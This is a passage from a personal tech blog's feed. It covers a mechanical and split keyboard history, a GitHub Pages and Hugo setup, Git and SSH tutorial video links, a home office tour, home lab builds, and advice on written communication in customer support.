+<p>The downside of the 7g, at that time, was that it was using MX Black switches which have very heavy springs. While this is a huge benefit for FPS gaming, to avoid misclicks, it is <em>exhausting</em> on the fingers for long bouts of typing, or in any game where you&rsquo;re mashing keys for a long period of time (e.g. MMOs). At this time, I was also really into Starcraft, and that&rsquo;s when I stumbled across a popular streamer (at the time) who made use of a keyboard with MX Blue switches. I had found my next love.</p>
+<p>Well, I picked up a cheap Coolermaster Quickfire board that used MX Blue switches and I loved it. I used it all the time, but my SO at the time was highly offended by the noise so I had to find something new. That lead me to another Coolermaster Quickfire using MX Red switches - these are linear, so no clickyness. Another great experience, and the MX Red switches reminded me a lot of the MX Blacks in my 7g, but without anywhere near as much force required for key activation.</p>
+<p>I missed my noisy, clicky, switches though. I wound up buying yet another Coolermaster board with the thought of &ldquo;well these have both been great so far, let&rsquo;s get another from the same brand&rdquo;, but this time with MX Brown switches (yes, I know&hellip; but I still like them). That keyboard had a few keys flat out die within a few months, so I got another, same deal.. Ugh. I guess quality control isnt' Coolermaster&rsquo;s strong suit. I wound up fixing both of these keyboards years later thanks to some expanded electronics knowledge (some of the traces had broken and needed to be bridged).</p>
+<p>Welp, I still wanted mechanical, I wanted clicky, I wanted quiet&hellip; MX Browns were still the logical choice in my mind, so I bought a Das Keyboard 4C. This company has since fallen from grace a bit, but at the time it was a popular brand. I loved this keyboard, still have it, and it still works, but it also got me used to the idea of spending a lot more money on an input device. The build quality was light years beyond the Coolermaster boards - it was heavy, it was quiet, it felt <em>good</em>.</p>
+<p>This wound up pushing me even further down the rabbit hole and I started seeing &ldquo;weird&rdquo; keyboards like the Ergodox pop up from time to time, or even more strangely keyboards like the Dactyl Manuform. These looked too weird to be used by a human, but they were also weird enough to be of interest and occupied my mind.</p>
+<p>Fast forward another 4 years. I&rsquo;m getting older. Working with shitty ergonomics is taking its toll on my shoulders, wrists, and elbows. It&rsquo;s time for a change. I&rsquo;ve got the standing desk, I&rsquo;ve got the ergnomic chair, I&rsquo;m at a 90/90/90 position, but I still can&rsquo;t shake this shoulder and wrist pain. It was time to try one of those &ldquo;weird&rdquo; split keyboards. I bought a ZSA Moonlander.</p>
+<p>HOLY SHIT! It was a fucking epiphany. My life was forever changed.</p>
+<p>I can type in a comfortable position? I can remap any key I want? I can have the same key do different things <em>that I choose</em> depending on how I use it? Mind = Blown. Granted, the functionality is thanks to the QMK firmware that&rsquo;s used, which is also available for non-split keyboards, but the combination of that and the ergonomic changes of being able to keep my arms straight out at shoulder width as well as tenting the keyboard to reduce wrist/forearm strain was <em>huge</em>.</p>
+<p>Here I am about 6 months into ownership of my Moonlander, nd I&rsquo;m already eying up my next build, though it&rsquo;ll be one for travel purposes as I&rsquo;m very happy with the Moonlander. It&rsquo;ll probably be a Gergo or an Iris (have fun googling those), but I&rsquo;m totally undecided on switches. This journey also lead me to discove r that there are switches other than the Cherry MX line&hellip; Gateron, Holy Pandas, Zeal, Kailh, etc&hellip; Lots to explore, and depending on who you ask, they&rsquo;re all better than anything that Cherry puts out. Oh, and people <em>lube</em> their switches for quieter/cleaner operation - something I didn&rsquo;t know I needed, but now am reasonably sure I can&rsquo;t live without.</p>
+<h1 id="tldr">TL;DR?</h1>
+<ul>
+<li>Normal keyboards have awful ergnomics. Look at a split keyboard.</li>
+<li>Membrane keyboards <em>feel</em> awful. Get mechanical switches. Even if it&rsquo;s a cheap board, it&rsquo;ll be a big difference.</li>
+<li>The ergnomic and productivity benefits of having a keyboard that uses QMK (or another similar firmware) are huge. Put your keys wherever you want, change their behaviour however you want. Does thinking about taking a screenshot with Command + Option + Shift + 4 make your wrist hurt? Map it to a single key without the need for any additional software on your computer.</li>
+<li>Prepare your wallet&hellip;</li>
+</ul>
+]]></content></item><item><title>Hello via GitHub Pages</title><link>https://maclarel.github.io/posts/2021-01/github-pages/</link><pubDate>Mon, 18 Jan 2021 00:00:00 +0000</pubDate><guid>https://maclarel.github.io/posts/2021-01/github-pages/</guid><description>Well this is new&amp;hellip; Rather than dealing with Blogger, a dubious mobile interface, and spreading things across many services&amp;hellip; why not just use GitHub Pages? I&amp;rsquo;m so used to writing markdown at this point that it just seems easier 😄
+Hugo Inspired by tmpdubz I figured I&amp;rsquo;d do a double-whammy here - play around with/learn GitHub Pages, while also giving my blog a much needed cosmetic overhaul/simplification/rebranding. This lead to Hugo, which is pretty darn neat.</description><content type="html"><![CDATA[<h1 id="well-this-is-new">Well this is new&hellip;</h1>
+<p>Rather than dealing with Blogger, a dubious mobile interface, and spreading things across many services&hellip; why not just use GitHub Pages? I&rsquo;m so used to writing markdown at this point that it just seems easier 😄</p>
+<h1 id="hugo">Hugo</h1>
+<p>Inspired by <a href="https://github.com/tmpdubz">tmpdubz</a> I figured I&rsquo;d do a double-whammy here - play around with/learn GitHub Pages, while also giving my blog a much needed cosmetic overhaul/simplification/rebranding. This lead to <a href="https://gohugo.io/">Hugo</a>, which is pretty darn neat.</p>
+<p>Hugo is reasonably well documented, config driven, and quite intuitive to pick up and run with. Setting up this whole blog system on GitHub Pages took under 15 minutes (not including manually migrating blog content over).</p>
+<p>Check it out if you&rsquo;re looking to throw together a simple site! You can check out what a finished project looks like by reviewing what&rsquo;s powering this very blog <a href="https://github.com/maclarel/maclarel.github.io">in my GitHub repo</a>.</p>
+]]></content></item><item><title>Git &amp; GitHub Tutorial - Part 2 - Branching, forking, and pull requests</title><link>https://maclarel.github.io/posts/2020-08/github-tutorial-part-2/</link><pubDate>Sun, 02 Aug 2020 00:00:00 +0000</pubDate><guid>https://maclarel.github.io/posts/2020-08/github-tutorial-part-2/</guid><description>This is part 2 of a Git tutorial series - I recommend watching part 1 @ https://youtu.be/jhgoGnYgPuY first!
+In this video we take a look at creating new branches in a Git repository, forking other repositories, and creating pull requests:</description><content type="html"><![CDATA[<p>This is part 2 of a Git tutorial series - I recommend watching part 1 @ <a href="https://youtu.be/jhgoGnYgPuY">https://youtu.be/jhgoGnYgPuY</a> first!</p>
+<p>In this video we take a look at creating new branches in a Git repository, forking other repositories, and creating pull requests:</p>
+<p><a href="https://www.youtube.com/watch?v=V8vUYUvDSfY"><img src="http://img.youtube.com/vi/V8vUYUvDSfY/0.jpg" alt="GitHub Tutorial - Part 2"></a></p>
+]]></content></item><item><title>Git &amp; GitHub Tutorial - Part 1 - Creating &amp; using a Git repository</title><link>https://maclarel.github.io/posts/2020-07/github-tutorial-part-1/</link><pubDate>Sun, 26 Jul 2020 00:00:00 +0000</pubDate><guid>https://maclarel.github.io/posts/2020-07/github-tutorial-part-1/</guid><description>In this video we start to delve into using Git and GitHub to track a project. We will create a repository, clone it, make changes, and push those changes back up to GitHub so that everyone can view them!</description><content type="html"><![CDATA[<p>In this video we start to delve into using Git and GitHub to track a project. We will create a repository, clone it, make changes, and push those changes back up to GitHub so that everyone can view them!</p>
+<p><a href="https://www.youtube.com/watch?v=jhgoGnYgPuY"><img src="http://img.youtube.com/vi/jhgoGnYgPuY/0.jpg" alt="GitHub Tutorial - Part 1"></a></p>
+]]></content></item><item><title>Key-based Authentication for SSH</title><link>https://maclarel.github.io/posts/2020-07/key-based-auth-ssh/</link><pubDate>Sun, 19 Jul 2020 00:00:00 +0000</pubDate><guid>https://maclarel.github.io/posts/2020-07/key-based-auth-ssh/</guid><description>Tired of trying to remember passwords for every system you access, or annoyed that every system uses the same password? Let&amp;rsquo;s look at a more secure approach that can solve both problems - key based authentication with SSH!</description><content type="html"><![CDATA[<p>Tired of trying to remember passwords for every system you access, or annoyed that every system uses the same password? Let&rsquo;s look at a more secure approach that can solve both problems - key based authentication with SSH!</p>
+<p><a href="https://www.youtube.com/watch?v=tSqyTH_QS1I"><img src="http://img.youtube.com/vi/tSqyTH_QS1I/0.jpg" alt="Key-based Auth Tutorial"></a></p>
+]]></content></item><item><title>SSH Port Forwarding</title><link>https://maclarel.github.io/posts/2020-07/ssh-port-forwarding/</link><pubDate>Sun, 19 Jul 2020 00:00:00 +0000</pubDate><guid>https://maclarel.github.io/posts/2020-07/ssh-port-forwarding/</guid><description>Have a service that you don&amp;rsquo;t want to directly expose, or that doesn&amp;rsquo;t have good security, that you still need to access? Today we&amp;rsquo;re going to look at using SSH to accomplish this!
+This tutorial uses nc, UFW/IPTables, and SSH to demonstrate how to forward any port over an SSH connection on TCP 22. You can extend this to just about any service. For example, this works for accessing websites, or other services that are exposed through a web browser.</description><content type="html"><![CDATA[<p>Have a service that you don&rsquo;t want to directly expose, or that doesn&rsquo;t have good security, that you still need to access? Today we&rsquo;re going to look at using SSH to accomplish this!</p>
+<p>This tutorial uses <code>nc</code>, <code>UFW/IPTables</code>, and <code>SSH</code> to demonstrate how to forward any port over an SSH connection on TCP 22. You can extend this to just about any service. For example, this works for accessing websites, or other services that are exposed through a web browser.</p>
+<p><a href="https://www.youtube.com/watch?v=hb80XpmLJ1U"><img src="http://img.youtube.com/vi/hb80XpmLJ1U/0.jpg" alt="SSH Port Forwarding"></a></p>
+]]></content></item><item><title>Home Office Tour</title><link>https://maclarel.github.io/posts/2020-07/home-office-tour/</link><pubDate>Sun, 05 Jul 2020 00:00:00 +0000</pubDate><guid>https://maclarel.github.io/posts/2020-07/home-office-tour/</guid><description>A quick tour of my full time work-from-home office! I&amp;rsquo;ve been working remote for many years now, and for the past ~18 months I&amp;rsquo;ve been working from home almost exclusively (no more travel).
+This is a quick look over the setup that I use every day!
+Equipment shown:
+Desk: Jarvis Standing Desk Monitor: LG 38UC99-W Monitor Arm: Amazon Basics Premium Mouse: Logitech MX Master Keyboard: Das Keyboard 4C Professional (MX Brown) Laptop Stand: Rain Design mStand Dock: CalDigit TS3 Plus Chair: HÅG Capisco Puls Standing mat: Ergodriven Topo</description><content type="html"><![CDATA[<p>A quick tour of my full time work-from-home office! I&rsquo;ve been working remote for many years now, and for the past ~18 months I&rsquo;ve been working from home almost exclusively (no more travel).</p>
+<p>This is a quick look over the setup that I use every day!</p>
+<p>Equipment shown:</p>
+<ul>
+<li>Desk: Jarvis Standing Desk</li>
+<li>Monitor: LG 38UC99-W</li>
+<li>Monitor Arm: Amazon Basics Premium</li>
+<li>Mouse: Logitech MX Master</li>
+<li>Keyboard: Das Keyboard 4C Professional (MX Brown)</li>
+<li>Laptop Stand: Rain Design mStand</li>
+<li>Dock: CalDigit TS3 Plus</li>
+<li>Chair: HÅG Capisco Puls</li>
+<li>Standing mat: Ergodriven Topo</li>
+</ul>
+<p><a href="https://www.youtube.com/watch?v=blZYivfDoDs"><img src="http://img.youtube.com/vi/blZYivfDoDs/0.jpg" alt="Home Office Walkthrough"></a></p>
+]]></content></item><item><title>Home lab updates</title><link>https://maclarel.github.io/posts/2020-04/home-lab-updates/</link><pubDate>Wed, 22 Apr 2020 00:00:00 +0000</pubDate><guid>https://maclarel.github.io/posts/2020-04/home-lab-updates/</guid><description>Following up from my &amp;ldquo;Starting out with a home lab&amp;rdquo; article I&amp;rsquo;ve made some pretty nice updates to my home lab setup, and I&amp;rsquo;ve also got my {Ansible playbooks](https://github.com/maclarel/ansible_playbooks) up on GitHub now!
+Starting out with the lab additions:
+Gigabit internet (Cable, unfortunately) recently became available here, so I&amp;rsquo;ve now got a 1000/30 connection! Upload speeds are depressing, but still 3x the speed I had previously! UniFi Dream Machine has taken over my network.</description><content type="html"><![CDATA[<p>Following up from my &ldquo;Starting out with a home lab&rdquo; article I&rsquo;ve made some pretty nice updates to my home lab setup, and I&rsquo;ve also got my {Ansible playbooks](<a href="https://github.com/maclarel/ansible_playbooks">https://github.com/maclarel/ansible_playbooks</a>) up on GitHub now!</p>
+<p>Starting out with the lab additions:</p>
+<ul>
+<li>Gigabit internet (Cable, unfortunately) recently became available here, so I&rsquo;ve now got a 1000/30 connection! Upload speeds are depressing, but still 3x the speed I had previously!</li>
+<li><a href="https://store.ui.com/collections/unifi-network-routing-switching/products/unifi-dream-machine">UniFi Dream Machine</a> has taken over my network. This thing is literally stepping forward 15 years in terms of technology over what I was previously using&hellip;</li>
+<li><a href="https://store.ui.com/collections/wireless/products/unifi-nanohd-us?_pos=1&amp;_sid=b2cf06452&amp;_ss=r">UniFi NanoHD Access Point</a> for improved network connectivity on the second floor of my house. Dramatic improvement in connection quality!
+And perhaps most importantly, the whole layout is now more A E S T H E T I C&hellip;</li>
+</ul>
+<p>Before:</p>
+<p><img src="https://i.redd.it/wbluzsg4nvt41.jpg" alt="oldandbusted"></p>
+<p>After:</p>
+<p><img src="https://i.imgur.com/1tjFzgF.jpg" alt="newhotness"></p>
+<p>Significant improvements all around!</p>
+]]></content></item><item><title>Written communication for Support</title><link>https://maclarel.github.io/posts/2020-04/written-communication-for-support/</link><pubDate>Sun, 12 Apr 2020 00:00:00 +0000</pubDate><guid>https://maclarel.github.io/posts/2020-04/written-communication-for-support/</guid><description>I&amp;rsquo;ve been working in customer facing roles for quite a while now. Granted, these have largely had the luxury of being in software companies, but I&amp;rsquo;ve also done a brief retail stint and I&amp;rsquo;d like to think the same skills apply in all cases.
+While this will be by no means exhaustive, I want to go over two high-level concepts that I feel are extremely important, and can sometimes be overlooked even by veterans in customer facing positions.</description><content type="html"><![CDATA[<p>I&rsquo;ve been working in customer facing roles for quite a while now. Granted, these have largely had the luxury of being in software companies, but I&rsquo;ve also done a brief retail stint and I&rsquo;d like to think the same skills apply in all cases.</p>
+<p>While this will be by no means exhaustive, I want to go over two high-level concepts that I feel are extremely important, and can sometimes be overlooked even by veterans in customer facing positions.</p>
+<h1 id="managing-expectations">Managing Expectations</h1>
+<p>This may sound simple, and it is a straight forward concept, but it&rsquo;s all too oft ignored. We&rsquo;ll dive into some examples below as to how easy it is to really nail this and create a great customer experience.</p>
+<h2 id="setting-expectations">Setting Expectations</h2>
+<p>Have you ever received this email when working with a company?</p>
+<pre><code>Hi &lt;Name&gt;,
+
+Thanks for reaching out for assistance!
+
+We understand that you're encountering problem &lt;X&gt; which is blocking your work. Thanks so much for providing the steps to reproduce this problem! I'll see if I can reproduce this problem here, and will be in touch.
+
+Regards,
+&lt;Friendly Support Person&gt;
+</code></pre><p>Hmmmm&hellip; What&rsquo;s wrong here?</p>
+<ul>
+<li>The person asking for help is politely acknowledged and greeted.</li>
+<li>The problem is restarted for clarity, including acknowledging the severity of the issue.</li>
+<li>The reproducible testcase is acknowledged.</li>
+<li>Next steps are specified.</li>
+<li>There&rsquo;s a friendly closing.</li>
+</ul>
+<p>Can&rsquo;t put your finger on it? There&rsquo;s no timeline associated with the next steps!</p>
+<p>This seems pretty minor, but let&rsquo;s flesh this scenario out a little bit, and let&rsquo;s say that I&rsquo;m the person asking for assistance. I&rsquo;ve clearly run into a problem and it&rsquo;s significant enough that I&rsquo;ve taken the time to send in a request for assistance because I can&rsquo;t progress on my work. It&rsquo;s wonderful that I&rsquo;ve reached someone willing to help, and that they understand the problem at a high enough level to paraphrase it, but now I&rsquo;m left with absolutely no understanding of when I&rsquo;ll hear back.</p>
+<p>You may be reading this and think that the next steps are solely with the person troubleshooting the problem on the Support side, but you&rsquo;d be partially wrong. With no firm timeline established, the affected user who submitted the ticket also has to proactively reach out to Support if they need an update, since they don&rsquo;t know when they&rsquo;ll hear back. This makes for a poor customer experience since they&rsquo;re left wondering if they&rsquo;re going to hear back in an hour, a day, a week, or never.</p>
+<p>All to often I&rsquo;ll see this scenario play out, even with industry veterans, and almost without fail the very next entry in the ticket (regardless of timeline) is from the customer saying &ldquo;Any updates?&rdquo;.</p>
+<p>Let&rsquo;s do a small tweak, and outline the impact it has:</p>
+<pre><code>Hi &lt;Name&gt;,
+
+Thanks for reaching out for assistance!
+
+We understand that you're encountering problem &lt;X&gt; which is blocking your work. Thanks so much for providing the steps to reproduce this problem! I'll see if I can reproduce this problem here, and will provide you with an update by close of business tomorrow. 
+
+Regards,
+&lt;Friendly Support Person&gt;
+</code></pre><p>All we&rsquo;ve done here is provide a timeline of getting a response by the end of the following day, but let&rsquo;s dive into what that entails:</p>
+<ul>
+<li>The customer now knows when they&rsquo;ll receive next contact, so they know they don&rsquo;t need to follow up before then unless something changes.</li>
+<li>This gives the customer a clear path to update the ticket owner on changing priorities. For example, is this actually blocking their whole team and not just them? Is there a business critical function that needs to happen by the end of the same day, meaning tomorrow is too late?</li>
+<li>The ticket owner now has an obligation to address the issue on the timeline they&rsquo;ve specified, meaning they can better prioritize, instead of just throwing the issue into their (potentially large) backlog.</li>
+</ul>
+<h2 id="resetting-expectations">Resetting Expectations</h2>
+<p>In a perfect world, the severity of the problem in the example above was well communicated and ticket owner would provide a material update before the close of business the following day. Great, case closed (or at least notably progressed), but we all know that&rsquo;s not always what happens.</p>
+<p>Let&rsquo;s talk about resetting expectations that were set.</p>
+<p>Things change. The customer who submitted that example ticket isn&rsquo;t the only person having problems. Let&rsquo;s assume for a moment that the ticket owner got hit with a much more important problem - like another customer being completely down and blocked - and they haven&rsquo;t had time to address our example problem.</p>
+<p>There are two likely scenarios, and outcomes, of this.</p>
+<h3 id="scenario-1----the-ticket-does-not-receive-an-update-before-close-of-business-the-following-day">Scenario 1 -  The ticket does not receive an update before close of business the following day</h3>
+<p>This is the most common scenario I see from less experienced folks. Unfortunately, it tends to drive a far more negative outcome than you may expect at face value. Fortunately, it&rsquo;s a very easy problem to address!</p>
+<p>Having dealt with customers as a front-line customer support person, an escalation point, a team lead, a main point-of-contact, and as a direct customer advocate, for almost 14 years I can quite comfortably tell you that the #1 cause of customer frustration is not receiving timely updates.</p>
+<p>In this case, the customer is left without any information as to the status of their request and feels ignored. It&rsquo;s a safe bet that (assuming they haven&rsquo;t given up) that ticket owner is going to come in the next morning and see &ldquo;Any updates?&rdquo; front and center on that ticket. The customer won&rsquo;t be happy.</p>
+<h3 id="scenario-2---the-ticket-is-updated-before-the-close-of-business-the-following-day-saying-that-theres-no-progress">Scenario 2 - The ticket is updated before the close of business the following day saying that there&rsquo;s no progress</h3>
+<p>Prior to the end of the following day, the ticket owner sends off this update:</p>
+<pre><code>Hi &lt;Name&gt;,
+
+I just wanted to send you an update to note that I'm still looking into this here. I'll be in touch ASAP with next steps.
+
+Regards,
+&lt;Friendly Support Person&gt;
+</code></pre><p>We&rsquo;re making progress with this, but still not perfect! Let&rsquo;s take a look at Scenario 3 for how we can reliable salvage this.</p>
+<h3 id="scenario-3---the-ticket-is-updated-and-expectations-are-reset">Scenario 3 - The ticket is updated, and expectations are reset</h3>
+<p>All we&rsquo;re going to do here is a minor tweak to the wording above. This will let us reset expectations with the customer and keep the next steps entirely on the Support side (save for a possible escalation).</p>
+<pre><code>Hi &lt;Name&gt;,
+
+I just wanted to send you an update to note that I'm still looking into this here. I'll be looking into this first thing tomorrow morning and will provide you with an update by mid-day tomorrow.
+
+Regards,
+&lt;Friendly Support Person&gt;
+</code></pre><p>The customer has been informed of the delay, understands the prioritization moving forward, and knows to expect an update at the discussed time. This, in general, will keep them happy!</p>
+<h2 id="further-breakdown">Further breakdown</h2>
+<p>Obviously there&rsquo;s nuance to this, but as discussed above this is the most common cause for ticket escalations and overall poor customer experience. Overall length of time to (successfully) close a ticket is a distant second in terms of drivers for negative customer satisfaction behind a lack of communication.</p>
+<p>While this scenario can be intimidating, I&rsquo;ll also not that you&rsquo;re significantly less likely to get directly negative feedback from a customer when providing a wrong answer, as long as it&rsquo;s done in a timely fashion and leaves the door open for them to follow-up with you.</p>
+<h1 id="professional-written-communication">Professional Written Communication</h1>
+<p>I&rsquo;ll start out by noting that there&rsquo;s a difference between formal communication and professional communication. A lot of this will come down to the company that you&rsquo;re working with, and the &ldquo;voice&rdquo; that they are trying to present. For the sake of this section, we&rsquo;re not discussing formal writing as that&rsquo;s it&rsquo;s own skill in many cases.</p>
+<p>To start out with, this is not intended to &ldquo;shame&rdquo; anyone who is not a native speaker of whatever language they are communicating in. English, in particular, is a disaster of a language and (in my opinion) it&rsquo;s reasonably ignorant to judge someone based on their grasp of a non-native language. If you fall into this bucket, I&rsquo;d strongly recommend the use of a Linter to help catch spelling and grammatical issues, such as linter-write-good for Atom.</p>
+<p>With that out of the way, the high-level things we want to note here are:</p>
+<ul>
+<li>Organization of thoughts</li>
+<li>Clear and concise wording</li>
+<li>Proper punctuation, spelling, and grammar</li>
+</ul>
+<h2 id="organizing-your-thoughts">Organizing your Thoughts</h2>
+<p>Issues can be complex, and responses can necessitate jumping between multiple logical scenarios. When you find yourself in this scenario, it can be very helpful to include things like headers (for example, the &ldquo;Organizing your Thoughts&rdquo; header here) to more clearly define context.</p>
+<p>Similarly, it can be helpful to have a very high level summary, sometimes using bullet points or a numbered list, to specifically outline the information that will be further discussed&hellip; as we&rsquo;ve also done here.</p>
+<p>Clear and Concise Wording</p>
+<p>Time is valuable. If you can clearly, and politely, communicate a thought in two sentences instead of two paragraphs, do it. I&rsquo;ll provide examples of good, and bad, responses below. We&rsquo;ll strip the pleasantries since we&rsquo;re just focusing on content.</p>
+<h3 id="example-1">Example 1</h3>
+<pre><code>I can see that in function findTheThing you've used a brute-force search across the array to find duplicate values. This type of approach is quite inefficient with large data sets.
+
+You may want to consider loading values into a set for evaluation as this will likely perform much better.
+</code></pre><h3 id="example-2">Example 2</h3>
+<pre><code> I can see that in function findTheThing you've used a brute-force search across the array to find duplicate values. While a brute-force search is simple to implement, and will always find a solution if it exists, its cost is proportional to the number of candidate solutions – which in many practical problems tends to grow very quickly as the size of the problem increases 
+
+You may want to consider loading values into a set for evaluation as this will likely perform much better. A set will allow you to only store the required values until a duplicate is found, which will likely result in significantly smaller memory utilization.
+</code></pre><p>I&rsquo;ll note that both of these are completely valid responses that most customers would be happy to receive. In order to keep you, the reader of this article, paying attention I&rsquo;ve limited the verbosity that could have otherwise been included in <code>Example 2</code>.</p>
+<p>At the end of the day here, you&rsquo;ll need to know your audience. In the example above, if it&rsquo;s safe to assume that your reader knows what a set is from a computer science perspective there&rsquo;s probably no need to explain how it should be implemented, or how it will differ from a brute-force search of an entire array.</p>
+<h2 id="punctuation-spelling-and-grammar">Punctuation, Spelling, and Grammar</h2>
+<p>I&rsquo;m not going to dive into whether or not you should use Oxford commas, or try to note that you need to ensure you have sentence structure that your 10th grade English teacher would give you an A+ on. The goal here is to be legible, avoid ambiguity, and avoid reader frustration.</p>
+<ul>
+<li>Use paragraphs to logically divide thoughts.</li>
+<li>Avoid run-on sentences.</li>
+<li>Know the difference between your/you&rsquo;re, its/it&rsquo;s, there/their/they&rsquo;re, etc.
+<ul>
+<li>Again, a Linter will help here if you&rsquo;re not a native English speaker.</li>
+</ul>
+</li>
+<li>Proof-read your messages.</li>
+</ul>
+<p>I&rsquo;ll paraphrase a message I received recently which I think is a prime example of how not to write something.</p>
+<pre><code>Hi Logan,
+
+Hope you are doing well,
+
+I see you have a problem and I would be more than happy to help you fix this problem that you described in your original message.
+
+Please can you send me the following information - what version you are using, what operating system you are using for example Windows or Mac, and what browser? These information's will help to resolve your issue more quickly so it would be very helpful if you can provide them quickly thanks!
+
+Regards,
+&lt;Name&gt;
+</code></pre><p>I actually cringed when reading the message that inspired this&hellip; and while writing this. Can I understand what they need? Absolutely. Did I have to re-read this a few times to understand? You bet.</p>
+<p>As a &ldquo;fun&rdquo; exercise, try rewriting this in the comments below and see if you can clean it up!</p>
+<h1 id="wrapping-up">Wrapping up</h1>
+<p>I know that this all seems very basic, and it is, but it&rsquo;s the kind of thing where practice makes perfect. It&rsquo;s also very easy to get into bad habits like not proof-reading messages before sending or not providing enough information in responses. Experience certainly helps.</p>
+<p>There are many other concepts we could discuss, and maybe they&rsquo;ll be done so in another post, but I&rsquo;ll leave you all with one final recommendation:</p>
+<p>If you are providing someone with technical instructions, be sure to test the instructions first or specifically outline if they have not been tested. Nothing is worse than being on the receiving end of something that doesn&rsquo;t work at all when dealing with an &ldquo;expert&rdquo;. Mistakes certainly happen, but this one can generally be avoided pretty easily.</p>
+]]></content></item><item><title>Starting out with a home lab</title><link>https://maclarel.github.io/posts/2020-04/starting-out-with-a-home-lab/</link><pubDate>Sat, 04 Apr 2020 00:00:00 +0000</pubDate><guid>https://maclarel.github.io/posts/2020-04/starting-out-with-a-home-lab/</guid><description>Why do I want a home lab? While only you, the reader, can answer this, there are many reasons that I&amp;rsquo;ve build one out. I imagine your reasoning will be similar.
+There are things you want to have, or automate, that are simply obnoxious otherwise. You&amp;rsquo;ve got specific technologies that you want to explore without a full scale investment. You&amp;rsquo;re working toward certifications (or hands-on experience) with technologies that you want to be using for work.</description><content type="html"><![CDATA[<h1 id="why-do-i-want-a-home-lab">Why do I want a home lab?</h1>
+<p>While only you, the reader, can answer this, there are many reasons that I&rsquo;ve build one out. I imagine your reasoning will be similar.</p>
+<ul>
+<li>There are things you want to have, or automate, that are simply obnoxious otherwise.</li>
+<li>You&rsquo;ve got specific technologies that you want to explore without a full scale investment.</li>
+<li>You&rsquo;re working toward certifications (or hands-on experience) with technologies that you want to be using for work.</li>
+</ul>
+<p>Personally, I just want to tinker. I&rsquo;m very lucky to have access to all of the tooling I need for my day job through work. With that said, there&rsquo;s a lot that I want to play with outside of that scope as well as many &ldquo;quality of life&rdquo; improvements that I want for my home network such as:</p>
+<ul>
+<li>Ad-blocking</li>
+<li>In-home media storage &amp; streaming</li>
+<li>On-site Backups</li>
+<li>Home &amp; network security</li>
+<li>Tinkering and learning</li>
+</ul>
+<h1 id="but-i-dont-have-a-server">But I don&rsquo;t have a server!</h1>
+<p>The biggest misconception that people have about setting up a home lab is that they need to run out and buy a used Dell R710 (or something similar), load it with hard drives, and install <a href="https://www.proxmox.com/">Proxmox</a> or <a href="https://www.vmware.com/content/vmware/vmware-published-sites/us/products/esxi-and-esx.html.html">ESXi</a> just to get started.</p>
+<p>Let&rsquo;s talk about the reality. Do you have an old  laptop? Maybe an old gaming rig that you recently replaced? Cool! Ignore the rack-mounted server as you&rsquo;re 100% ready to get started.</p>
+<p>While Proxmox and ESXi are both awesome and great platforms to build your home lab on, you don&rsquo;t need them to test the waters. Regardless of what platform you&rsquo;re on, you can build VMs with <a href="https://www.virtualbox.org/wiki/Downloads">VirtualBox</a>, or if you&rsquo;re on Windows (10 or Server) specifically you can use <a href="https://docs.microsoft.com/en-us/virtualization/hyper-v-on-windows/quick-start/enable-hyper-v">HyperV</a> (<a href="https://www.thedatanewbie.com/2018/04/tutorial-set-up-linux-vm-on-windows.html">which I did a tutorial on a while back</a>. Lastly, you&rsquo;ve got the ability across all of these platforms to play with containerization with <a href="https://www.docker.com/">Docker</a> or <a href="https://kubernetes.io/">Kubernetes</a>.</p>
+<p>While we won&rsquo;t dive into the details of each of these technologies here, the point is simply that all of this is already available for you to work with and learn even if it&rsquo;s on a 10 year old Dell desktop you bought from a library!</p>
+<p>If you <em>really</em> don&rsquo;t have what you need here, there are tons of trial options with services like Amazon AWS EC2 or the free tier of Google Cloud Platform, not to mention things like partner codes for discounts with companies like <a href="https://www.linode.com/">Linode</a>.</p>
+<h1 id="what-does-my-home-lab-look-like">What does my home lab look like?</h1>
+<p>Building off of the info above, I don&rsquo;t have an &ldquo;impressive&rdquo; home lab by any stretch, but it still does everything I need. If IaaS isn&rsquo;t your thing, and you don&rsquo;t have a computer to play around with, you can pertty easily build out the same setup I&rsquo;m using for under $500CDN all-in.</p>
+<h2 id="my-lab">My &ldquo;lab&rdquo;</h2>
+<ul>
+<li>CPU - i5 4670k</li>
+<li>RAM -  16GB DDR3</li>
+<li>Storage - 256GB SSD, 2TB HDD, 2x 1TB HDD (RAID-1)</li>
+<li>NAS Storage - NetGear ReadyNAS NV+ w/ 4x 1.5TB HDD (RAID-5)</li>
+<li>Router - ASUS RT-N66U</li>
+<li>Switch - Unmanaged 8-port Gbit &amp; 24-port 100Mbit switches</li>
+</ul>
+<p>Yep, this is all old and busted&hellip; and it runs Windows 10.</p>
+<p>The CPU is 7 years old, and both the RAM and HDDs were bought used. The NAS is 10 years old and can&rsquo;t handle transfer speeds above 15MB/s despite having a 1Gbit NIC.</p>
+<p>But you know what? This setup still does everything I need. You can buy a comparable PC + hard drives for around $350CDN, and I got that NAS with its drives for $100 and a bottle of wine.</p>
+<h1 id="what-do-i-use-that-junk-listed-above-to-do">What do I use that junk listed above to do?</h1>
+<p>I&rsquo;ll start by noting that I&rsquo;m a hobbyist in this space. I use this setup to tinker and to handle some specific usecases for my home, as well as general learning. I&rsquo;d be pretty happy to recommend this setup for any low(er) level IT certification training, and it&rsquo;s absolutely sufficient as a development/testing environment across a variety of operating systems.</p>
+<p>With that out of the way, here&rsquo;s what I&rsquo;m using this setup for:</p>
+<ul>
+<li>4x Ubuntu Server VMs running under Hyper-V
+<ul>
+<li>ELK - Collecting system metrics and DNS info from all VMs</li>
+<li>Plex - Serving up media content (720p/1080p CPU transcoding)</li>
+<li>PiHole - Blocking adds and obnoxious traffic from my network.</li>
+<li>Ansible - Configuration management and automating updates across all of my VMs</li>
+</ul>
+</li>
+<li>2x RHEL VMs for certification training/tinkering</li>
+<li>OpenVPN server into my home network</li>
+<li>Torrenting &ldquo;Linux ISOs&rdquo;</li>
+<li>Securing outgoing network traffic over VPN</li>
+<li>NAS
+<ul>
+<li>Backups from all machines on my network (via OS tooling or rsync)</li>
+<li>Media storage (music, video, software, etc.)</li>
+</ul>
+</li>
+</ul>
+<p>A lot of these use cases are evolving. For example, I set up ELK stack mostly to play around with it and to refresh my knowledge since I&rsquo;d been away from it for a while, but it&rsquo;s not particularly useful for an environment my size outside of tinkering.</p>
+<h1 id="how-do-i-keep-track-of-all-these-things">How do I keep track of all these things?</h1>
+<p>Fortunately, this is pretty simple to answer. Ansible handles basically everything for me, pulling my configs from my (currently private) GitHub repositories and syncing them across all machines where they&rsquo;re needed.</p>
+<p>I&rsquo;ve got a goal of eventually making all of that public, but want to be sure it doesn&rsquo;t have too much information in it regarding my network/services/configurations.</p>
